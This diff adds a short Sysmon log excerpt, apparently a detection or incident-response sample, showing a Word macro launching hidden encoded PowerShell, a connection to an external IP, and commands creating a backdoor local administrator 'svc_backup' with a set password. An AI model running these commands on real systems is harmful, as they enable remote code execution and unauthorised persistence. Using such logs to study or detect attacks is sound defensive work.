@@ -1,0 +1,14 @@
+# Sysmon (host WIN-FIN-07, 10.1.1.20). EventID 1 = ProcessCreate, 3 =
+NetworkConnect
+2026-06-11 09:30:05 EventID=1 Image=powershell.exe ParentImage=winword.exe
+User=ACME\jsmith CommandLine="powershell -nop -w hidden -enc
+SQBFAFgAKABOAGUAdwAt...=="
+2026-06-11 09:30:11 EventID=3 Image=powershell.exe DestinationIp=45.137.21.130
+DestinationPort=80 User=ACME\jsmith
+2026-06-11 09:31:40 EventID=1 Image=cmd.exe ParentImage=powershell.exe
+User=ACME\jsmith CommandLine="cmd /c net user svc_backup Pa55w0rd!23 /add"
+2026-06-11 09:31:42 EventID=1 Image=cmd.exe ParentImage=powershell.exe
+User=ACME\jsmith CommandLine="cmd /c net localgroup Administrators svc_backup
+/add"
+2026-06-11 09:32:30 EventID=3 Image=powershell.exe DestinationIp=45.137.21.130
+DestinationPort=8080 User=ACME\jsmith
